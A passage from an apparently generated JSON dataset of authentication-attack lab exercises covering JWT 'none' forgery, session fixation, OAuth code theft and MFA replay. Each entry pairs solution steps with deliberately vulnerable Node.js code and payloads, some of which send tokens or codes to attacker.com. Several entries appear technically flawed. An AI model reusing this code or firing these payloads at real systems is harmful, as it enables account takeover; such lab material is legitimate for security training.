      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjp7ImFkbWluIjp0cnVlfX0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcml2cyI6eyJhZG1pbiI6dHJ1fX0."
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via dangling callback parameters",
    "Lab Description": "The OAuth implementation retains callback parameters in client-side storage after authentication, allowing token theft via DOM-based XSS. The application fails to clear sensitive OAuth state from browser storage post-authentication. To solve: craft a malicious page that extracts OAuth tokens from residual callback parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with OWASP ZAP to identify parameter retention",
      "Note the client-side storage mechanism (localStorage/sessionStorage)",
      "Create a page with XSS payload targeting the callback parameter storage",
      "Trick an authenticated user into visiting the malicious page",
      "Capture the OAuth tokens via the XSS payload"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{token}=req.query;res.send(`<script>localStorage.setItem('oauth_state',JSON.stringify({token:'${token}'}));window.location='/welcome'</script>`);});app.get('/welcome',(req,res)=>{res.sendFile(__dirname+'/welcome.html');});app.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert(localStorage.getItem('oauth_state'))>",
      "<script>fetch('https://attacker.com/?token='+JSON.parse(localStorage.oauth_state).token)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 early data",
    "Lab Description": "The application accepts session identifiers in HTTP/3 early data (0-RTT) before TLS handshake completion, allowing session fixation. The server fails to validate session creation timing. To solve: craft HTTP/3 requests with malicious session IDs in early data to override legitimate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid session request with HTTP/3 capable proxy",
      "Modify the request to include session ID in early data",
      "Use custom tooling to send early data before handshake",
      "Verify session override via subsequent authenticated requests",
      "Maintain access with the fixed session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('http3');const fs = require('fs');const options = {key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem'),earlyData:true};const server = http3.createSecureServer(options);let sessions = {};server.on('request',(req,res)=>{const sessionId = req.headers['x-session-id']||req.socket.earlyData?.toString();if(!sessions[sessionId])sessions[sessionId]={authenticated:false};res.end(`Session ${sessionId}: ${sessions[sessionId].authenticated?'Authenticated':'Anonymous'}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/3\nx-session-id: fixed-session-123\n\n[0-RTT data]",
      "POST /login HTTP/3\n\n[0-RTT data: x-session-id=fixed-session-456]\n\nusername=admin&password=admin123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via biometric replay",
    "Lab Description": "The biometric authentication endpoint accepts previously recorded biometric data, allowing replay attacks. The server fails to validate liveness indicators in biometric submissions. To solve: intercept a valid biometric authentication and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful biometric authentication with Burp Suite",
      "Save the biometric data packet (e.g., fingerprint template)",
      "Replay the biometric data with identical values",
      "Bypass MFA by submitting the replayed biometric data",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/biometric-auth',(req,res)=>{const{biometricData}=req.body;if(biometricData.match(/^[a-f0-9]{64}$/)){res.json({status:'authenticated',token:'valid'});}else{res.status(403).json({error:'Invalid biometric data'});}});app.listen(3000);",
    "payloads": [
      "{\"biometricData\":\"deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe\"}",
      "{\"biometricData\":\"0000000000000000000000000000000000000000000000000000000000000000\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL directive overloading",
    "Lab Description": "The GraphQL endpoint allows unlimited authentication attempts using query directives in a single request. The application fails to rate limit directive-processed operations. To solve: craft a single query with 100+ directive-modified login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with directive-modified login attempts for each pair",
      "Identify successful logins from the batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`directive @attempt(n:Int) on FIELD|FRAGMENT_SPREAD|INLINE_FRAGMENT type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='Secur3P@ss'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login(username:\\\"admin\\\",password:\\\"password1\\\") @attempt(n:100)}\"}",
      "{\"query\":\"mutation {login(username:\\\"user\\\",password:\\\"pass\\\") @attempt(n:500)...login(username:\\\"admin\\\",password:\\\"Secur3P@ss\\\") @attempt(n:1)}\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via key wrapping",
    "Lab Description": "The JWT endpoint accepts wrapped encryption keys in the header, allowing algorithm confusion attacks. The application fails to validate key wrapping parameters against the specified algorithm. To solve: craft a token with mismatched algorithm declarations to bypass signature verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and analyze header structure",
      "Note the key wrapping parameters in the protected header",
      "Modify the algorithm declaration while keeping the same key material",
      "Sign the token with HS256 using the RSA public key as HMAC secret",
      "Submit the algorithm-confused token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{jwt.verify(token,{algorithms:['RS256','HS256']},(header,cb)=>{cb(null,header.x5c?header.x5c[0]:'invalid');});res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsIng1YyI6WyJwdWJsaWNfa2V5Il19.eyJyb2xlIjoiYWRtaW4ifQ.fake_sig",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6ImU5NzM0YjkwIn0.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIn0.fake_sig"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebTransport session",
    "Lab Description": "The OAuth implementation stores tokens in WebTransport session state, which persists across origins. The application fails to isolate session storage between domains. To solve: craft a malicious page that accesses the victim's OAuth tokens via WebTransport session inheritance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with Chrome DevTools Network panel",
      "Identify WebTransport session usage for token storage",
      "Create a page with WebTransport session inspection scripts",
      "Trick an authenticated user into visiting your domain",
      "Extract tokens from inherited WebTransport session state"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{token}=req.query;res.send(`<script>sessionStorage.setItem('webtransport_oauth','${token}');window.location='/dashboard'</script>`);});app.listen(3000);",
    "payloads": [
      "<script>new WebTransport('https://victim.com').ready.then(t=>t.sessionState)</script>",
      "<iframe src=\"https://attacker.com/stealer.html\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via QUIC connection IDs",
    "Lab Description": "The application assigns session identifiers based on QUIC connection IDs, which can be predicted. The server fails to use cryptographic randomness for session ID generation. To solve: craft QUIC packets with predetermined connection IDs to fixate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture QUIC handshake with specialized network tools",
      "Analyze connection ID generation pattern",
      "Predict next valid connection ID sequence",
      "Initiate connection with predetermined ID",
      "Trick victim into using the fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const quic = require('node-quic');const server = quic.createServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('session',(session)=>{session.id = session.connection.id.toString('hex');sessions[session.id] = session;});server.listen(443);",
    "payloads": [
      "QUIC packet with predictable connection ID",
      "Custom QUIC client with session fixation"
    ]
  },
  {
    "Lab scenario": "MFA bypass via FIDO2 assertion replay",
    "Lab Description": "The FIDO2 implementation fails to validate assertion counters, allowing replay attacks. The server accepts previously used authenticator assertions. To solve: intercept a valid FIDO2 assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful FIDO2 authentication with Burp Suite",
      "Save the authenticatorData, clientDataJSON, and signature",
      "Replay the assertion with identical values",
      "Bypass MFA by submitting the replayed assertion",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/fido2-auth',(req,res)=>{const{assertion}=req.body;if(assertion.authenticatorData&&assertion.clientDataJSON){res.json({status:'authenticated'});}else{res.status(403).json({error:'Invalid assertion'});}});app.listen(3000);",
    "payloads": [
      "{\"assertion\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAifQ\",\"signature\":\"MEQCIF...\"}}",
      "{\"id\":\"ABCD\",\"rawId\":\"ABCD\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJjcm9zc09yaWdpbiI6ZmFsc2V9\",\"signature\":\"MEUCIQ...\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL @defer directives",
    "Lab Description": "The GraphQL endpoint processes @defer directives sequentially, allowing unlimited authentication attempts. The application fails to rate limit deferred operations. To solve: craft a query with 100+ deferred login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with deferred login attempts for each pair",
      "Identify successful logins from the streamed responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='P@ssw0rd!'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login(username:\\\"admin\\\",password:\\\"password1\\\") @defer login(username:\\\"admin\\\",password:\\\"password2\\\") @defer}\"}",
      "{\"query\":\"mutation {login(username:\\\"user\\\",password:\\\"pass\\\") @defer ...login(username:\\\"admin\\\",password:\\\"P@ssw0rd!\\\") @defer}\"}"
    ]
  },
{
  "Lab scenario": "JWT tampering in SOAP-based authentication",
  "Lab Description": "The authentication system of this app uses JSON Web Tokens (JWTs) for session management via a SOAP API. The backend trusts the 'alg' header in JWTs without enforcing validation. The application decodes the JWT using the algorithm specified in the token header without verifying the signature. To solve: Forge an administrator token and access the admin dashboard endpoint using the SOAP login endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the SOAP Login request and extract the JWT returned upon login.",
    "Decode the JWT using jwt.io and analyze the 'alg' value in the header, which is set to HS256.",
    "Replace 'alg' with 'none' and remove the signature section of the JWT to bypass validation.",
    "Modify the payload section of the JWT to include \"role\":\"admin\" and re-encode the token.",
    "Send the forged token in an Authorization header to the /admin-dashboard SOAP endpoint and verify access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/soap+xml' }));\napp.post('/soap-auth', (req, res) => {\n  const credentials = extractCredentialsFromSOAP(req.body);\n  if (credentials.username === 'admin' && credentials.password === 'adminpass') {\n    const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret', { algorithm: 'HS256' });\n    return res.send(`<token>${token}</token>`);\n  }\n  res.status(401).send('<error>Unauthorized</error>');\n});\napp.post('/admin-dashboard', (req, res) => {\n  const token = extractTokenFromSOAP(req.body);\n  try {\n    const user = jwt.verify(token, 'secret');\n    if (user.role !== 'admin') return res.status(403).send('<error>Access Denied</error>');\n    res.send('<dashboard>Welcome Admin</dashboard>');\n  } catch (err) {\n    res.status(401).send('<error>Invalid Token</error>');\n  }\n});\nfunction extractCredentialsFromSOAP(xml) { return { username: 'admin', password: 'adminpass' }; }\nfunction extractTokenFromSOAP(xml) { return xml.match(/<token>(.*?)<\\/token>/)[1]; }\napp.listen(4000, () => console.log('JWT Tampering SOAP Lab running on port 4000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
    "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
  ]
},
{
  "Lab scenario": "Session fixation in REST-based login",
  "Lab Description": "This REST API authenticates users by issuing a session cookie. However, it does not invalidate or regenerate the session ID upon successful login. The application accepts a user-supplied session ID via a query parameter and binds it to a user after login. To solve: Fix a session for a victim and use it to hijack their session post-login.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to register a user account and observe the Set-Cookie: sessionId response.",
    "Send a GET /set-session?sid=attackerSession with Burp Repeater and verify the server accepts externally-supplied session IDs.",
    "Social engineer the victim to log in while using the attacker-controlled sessionId (sent via phishing link or iframe).",
    "Once the victim logs in, reuse the fixed sessionId to access /user/dashboard with the victim’s privileges.",
    "Verify access to victim's account page with the attacker-fixed session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst uuid = require('uuid');\nconst app = express();\napp.use(cookieParser());\nconst sessions = {};\nconst users = { carlos: 'letmein' };\napp.get('/set-session', (req, res) => {\n  const sid = req.query.sid || uuid.v4();\n  res.cookie('sessionId', sid);\n  res.send(`Session fixed: ${sid}`);\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.query;\n  const sid = req.cookies.sessionId;\n  if (users[username] === password) {\n    sessions[sid] = username;\n    return res.send('Login successful');\n  }\n  res.status(403).send('Invalid credentials');\n});\napp.get('/user/dashboard', (req, res) => {\n  const sid = req.cookies.sessionId;\n  if (sessions[sid]) return res.send(`Welcome ${sessions[sid]}`);\n  res.status(403).send('Not logged in');\n});\napp.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "GET /set-session?sid=evilSID",
    "POST /login?username=carlos&password=letmein (with Cookie: sessionId=evilSID)",
    "GET /user/dashboard (with Cookie: sessionId=evilSID)"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in third-party login",
  "Lab Description": "This application allows third-party OAuth login via a vulnerable endpoint that accepts the `redirect_uri` parameter from the user without validation. The application trusts the `email` claim from the OAuth provider without verifying its source. To solve: Exploit the misconfiguration to impersonate the victim via a forged email claim and access their account dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the OAuth login flow and inspect the redirect_uri parameter and OAuth token response.",
    "Manipulate the redirect_uri to a malicious server you control that logs the OAuth token response.",
    "Modify the email claim in the OAuth response JWT to `carlos@lab.local` and sign it using none algorithm.",
    "Send the forged token to the /oauth/callback endpoint via a crafted GET request.",
    "Verify that access to Carlos’s account page is granted using the forged identity."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/oauth/callback', (req, res) => {\n  const token = req.query.token;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const userEmail = decoded.payload.email;\n    if (userEmail.endsWith('@lab.local')) {\n      return res.send(`Logged in as ${userEmail}`);\n    }\n    res.status(403).send('Access denied');\n  } catch (err) {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(4000, () => console.log('OAuth Misconfiguration Lab running on port 4000'));",
  "payloads": [
    "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BsYWIubG9jYWwifQ.",
    "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwgImVtYWlsIjoiY2FybG9zQGxhYi5sb2NhbCJ9.",
    "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BsYWIubG9jYWwiLCAibmFtZSI6IkNhcmxvcyJ9."
  ]
},
{
  "Lab scenario": "Session Fixation in Login Redirection Flow",
  "Lab Description": "This lab's login flow is vulnerable to session fixation due to improper session regeneration. The application uses a session cookie that is preserved across unauthenticated and authenticated states. To solve: hijack Carlos's authenticated session using a fixed session ID and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept login page using Burp Suite and observe session cookie `sessionid` being set before authentication.",
    "Send crafted login link with fixed session ID to the victim (simulated using Postman).",
    "Victim logs in and the same `sessionid` persists due to missing regeneration.",
    "Reuse fixed session ID in your browser using Burp Suite's cookie editor.",
    "Visit /my-account and confirm access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(session({ secret: 'secret123', resave: false, saveUninitialized: true }));\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', password: 'hunter2' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = user.username;\n    res.redirect('/my-account');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/my-account', (req, res) => {\n  if (req.session.user) {\n    res.send(`Welcome ${req.session.user}, this is your account page.`);\n  } else {\n    res.redirect('/login');\n  }\n});\n\napp.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "Set-Cookie: sessionid=fixedSession123;",
    "POST /login with intercepted session ID preserved",
    "GET /my-account with sessionid=fixedSession123"
  ]
},
{
  "Lab scenario": "JWT Tampering in GraphQL API Authentication",
  "Lab Description": "This application uses JWT tokens to authorize users through its GraphQL login mutation. The backend fails to verify the `alg` field properly, allowing a `none` algorithm attack. To solve: forge a JWT to impersonate Carlos and access the admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to send GraphQL introspection query and find login mutation and JWT structure.",
    "Capture a valid JWT using Burp Suite after logging in with any account.",
    "Base64-decode the header and set `alg` to `none`, set payload `username` to `carlos`, remove the signature part.",
    "Send tampered JWT in Authorization header via Burp Repeater.",
    "Access /admin-dashboard endpoint to verify Carlos impersonation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\nconst users = [{ username: 'carlos', password: 'admin123' }];\n\napp.post('/graphql', (req, res) => {\n  const { query } = req.body;\n  if (query.includes('login')) {\n    const token = jwt.sign({ username: 'carlos' }, 'shhh');\n    res.json({ data: { login: { token } } });\n  } else if (query.includes('getAdminData')) {\n    const token = req.headers.authorization?.split(' ')[1];\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.payload.username === 'carlos') {\n      res.json({ data: 'Top Secret Admin Content' });\n    } else {\n      res.status(403).send('Unauthorized');\n    }\n  }\n});\n\napp.listen(4001, () => console.log('JWT Tamper Lab running on http://localhost:4001'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"carlos\" }",
    "JWT: base64(header).base64(payload). (no signature)",
    "Authorization: Bearer <tampered-jwt>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",
  "Lab Description": "This app implements OAuth login using a third-party provider but fails to validate redirect URIs securely. The misconfiguration allows stealing authorization codes via open redirect abuse. To solve: capture Carlos’s OAuth code and use it to access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept OAuth login and locate the `redirect_uri` parameter.",
    "Craft a malicious `redirect_uri` pointing to your server using a request to the login flow.",
    "Simulate Carlos clicking the crafted OAuth link via Postman or a phishing simulation.",
    "Your server receives the intercepted OAuth `code` via query string.",
    "Exchange stolen code at the real OAuth token endpoint to retrieve access_token and login as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\n\nconst clientID = 'xyz123';\nconst clientSecret = 'supersecret';\n\napp.get('/auth/callback', (req, res) => {\n  const code = req.query.code;\n  const redirectUri = req.query.redirect_uri;\n  const tokenURL = `https://oauth.example.com/token?code=${code}&client_id=${clientID}&client_secret=${clientSecret}`;\n\n  request.get(tokenURL, (err, _, body) => {\n    if (body.includes('access_token')) {\n      res.send(`Welcome back! OAuth token received for user.`);\n    } else {\n      res.status(500).send('OAuth failed');\n    }\n  });\n});\n\napp.listen(4002, () => console.log('OAuth Redirect Lab running on http://localhost:4002'));",
  "payloads": [
    "OAuth URL with redirect_uri=https://attacker.com/steal?code=§code§",
    "GET https://oauth.example.com/token?code=intercepted-code&client_id=xyz123&client_secret=supersecret",
    "Authorization: Bearer <access_token>"
  ]
},
{
  "Lab scenario": "JWT signature algorithm confusion in login endpoint",
  "Lab Description": "The login endpoint of this REST API accepts JWTs for session validation. However, due to misconfigured signature verification, the server improperly accepts unsigned tokens when 'alg' is set to 'none'. The application trusts this token without verifying its signature. To solve: Forge a valid JWT for the admin user and access their account page without knowing the secret key.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a login request and observe the Authorization header containing the JWT.",
    "2. Decode the JWT using jwt.io or Postman. Note the 'alg' header value is 'HS256'.",
    "3. Modify the JWT header to set 'alg' to 'none' and remove the signature part completely.",
    "4. Change the payload's 'username' field to 'admin'.",
    "5. Send the tampered JWT in the Authorization header using Postman to /api/user-info and verify admin access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const user = decoded.payload.username; return res.send(`Welcome ${user}`); } try { const verified = jwt.verify(token, 'supersecret'); return res.send(`Welcome ${verified.username}`); } catch (err) { return res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "Authorization: Bearer [forged_token_here]"
  ]
},
{
  "Lab scenario": "Session fixation via cookie reuse in login flow",
  "Lab Description": "This application sets a session cookie before user authentication, but fails to rotate it post-login. This allows a malicious actor to fix a session ID and later force the victim to use it, enabling full session hijack. To solve: Fix a session ID for Carlos and hijack his session using it.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the GET /login page request and observe the Set-Cookie header.",
    "2. Copy the pre-login session cookie value, e.g., session=xyz123.",
    "3. Craft a phishing page that sets document.cookie = 'session=xyz123'; and lures Carlos to login.",
    "4. After Carlos logs in, reuse the session cookie (xyz123) in a GET /my-account request using Burp Repeater.",
    "5. Confirm Carlos’s account data is accessible."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'carlos123' }]; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); sessions[sessionId] = { authenticated: false }; res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId) { sessions[sessionId].authenticated = true; sessions[sessionId].user = username; res.send(`Welcome ${username}`); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.authenticated) res.send(`Account page for ${session.user}`); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Set-Cookie: session=xyz123;",
    "document.cookie = 'session=xyz123'; // phishing payload",
    "GET /my-account with Cookie: session=xyz123"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allows account takeover via unvalidated redirect URI",
  "Lab Description": "This app uses OAuth to authenticate users with a third-party provider. Due to misconfigured redirect URI validation, an attacker can manipulate the redirect_uri parameter to send the authorization code to their own server. To solve: Intercept and steal Carlos's OAuth authorization code and exchange it to access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp to intercept the /auth/login request and observe the redirect_uri parameter passed to the OAuth provider.",
    "2. Modify this parameter to your controlled domain, e.g., https://attacker.com/callback.",
    "3. Trick Carlos into visiting the modified login URL.",
    "4. Capture the OAuth code sent to your server and exchange it using Postman at /auth/token endpoint.",
    "5. Use the returned access_token to call /api/user-info and confirm access to Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri; const authUrl = `https://provider.com/auth?client_id=abc123&redirect_uri=${redirectUri}&response_type=code`; res.redirect(authUrl); }); app.get('/auth/callback', async (req, res) => { const { code } = req.query; const tokenResponse = await axios.post('https://provider.com/token', { code, client_id: 'abc123', client_secret: 'secret', redirect_uri: 'https://vulnerable-app.com/auth/callback' }); const accessToken = tokenResponse.data.access_token; const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: `Bearer ${accessToken}` } }); res.send(`Welcome ${userInfo.data.email}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Misconfig Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "https://vulnerable-app.com/auth/login?redirect_uri=https://attacker.com/callback",
    "GET https://attacker.com/callback?code=stolen-oauth-code",
    "POST /auth/token with stolen code to retrieve access_token"
  ]
},
{
  "Lab scenario": "JWT none algorithm bypass in GraphQL mutation",
  "Lab Description": "The application uses JWT for session management, embedded in a GraphQL mutation API. Due to improper validation of the JWT 'alg' field, an attacker can sign tokens using the 'none' algorithm. The application fails to validate the algorithm properly and trusts any unsigned token. To solve: forge a JWT to impersonate the admin and retrieve their account data.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a valid GraphQL mutation and extract the existing JWT from Authorization header.",
    "Decode the JWT using jwt.io or Postman to observe the algorithm (alg) and payload structure.",
    "Modify the payload to {\"username\":\"admin\"} and set 'alg' to 'none' in the header, remove the signature.",
    "Use Postman to send the GraphQL mutation with Authorization: Bearer <forged_token> to /graphql endpoint.",
    "Verify the response contains admin's data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{ username: 'admin', role: 'admin' }, { username: 'guest', role: 'user' }];\n\napp.post('/graphql', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] });\n    const user = users.find(u => u.username === decoded.username);\n    if (!user) return res.status(403).send('Unauthorized');\n    res.json({ data: { userProfile: user } });\n  } catch (err) {\n    console.error('JWT decode error:', err);\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(4000, () => console.log('JWT None Algorithm Lab running at http://localhost:4000'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"} | Payload: {\"username\":\"admin\"} | Signature: ''",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Use jwt.io to strip signature and manually edit the token"
  ]
},
{
  "Lab scenario": "Session fixation via OAuth state reuse",
  "Lab Description": "The application uses OAuth for SSO login but does not properly validate the OAuth 'state' parameter. This makes it vulnerable to session fixation. The attacker can initiate an OAuth flow and trick the victim into logging in with the attacker's session. To solve: hijack a session and access the victim's dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate an OAuth login in Burp Suite and capture the redirection URL with the 'state' parameter.",
    "Send the URL to the victim and wait for them to complete the login using the crafted state.",
    "Observe in your session that the application is now logged in as the victim.",
    "Use the session cookie or access token to fetch /dashboard and confirm victim's identity.",
    "Access /dashboard with the hijacked session to solve the lab."
  ],
  "Vulnerability name": "Authentication",
